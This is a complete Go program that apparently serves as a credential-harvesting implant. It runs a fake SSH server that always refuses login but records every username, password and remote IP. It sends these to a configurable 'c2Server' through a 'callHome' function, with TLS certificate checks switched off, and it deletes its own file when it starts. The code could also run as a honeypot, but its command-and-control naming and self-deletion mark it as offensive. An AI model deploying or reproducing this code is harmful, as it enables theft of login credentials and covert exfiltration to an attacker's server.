package main

import (
	"crypto/tls"
	"github.com/gliderlabs/ssh"
	"log"
	"os"
	"sync"
	"net/http"
	"net/url"
	"time"
	"bytes"
)

var (
	wg         sync.WaitGroup
	c2Server   string
	listenPort string
	fileName   string
)

func httpsClient() *http.Client {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{
                                InsecureSkipVerify: true,
                        },
                },
                Timeout: time.Second * 10,
        }
        return client
}

func getRequest(path string) error {
        client := httpsClient()
        resp, err := client.Get("https://" + path)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        return nil
}

func callHome(form url.Values) (error) {
	client := httpsClient()
	_ = getRequest(c2Server)
	formBody := bytes.NewBufferString(form.Encode())
	resp, err := client.Post("https://" + c2Server, "application/x-www-form-urlencoded", formBody)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func sshTrap() {
	ssh.Handle(func(s ssh.Session) {
		defer wg.Done()
	})

	log.Fatal(ssh.ListenAndServe(":"+listenPort, nil,
		ssh.PasswordAuth(func(ctx ssh.Context, pass string) bool {
			form := url.Values {
				"connection": {"SSH"},
				"remote_ip": {ctx.RemoteAddr().String()},
				"user": {ctx.User()},
				"pass": {pass},
			}
			_ = callHome(form)
			return false
		}),
	))
}

func removeFiles(file string) {
	_ = os.Remove(file)
}

func main() {
	removeFiles(fileName)
	wg.Add(1)
	go sshTrap()
	wg.Wait()
}
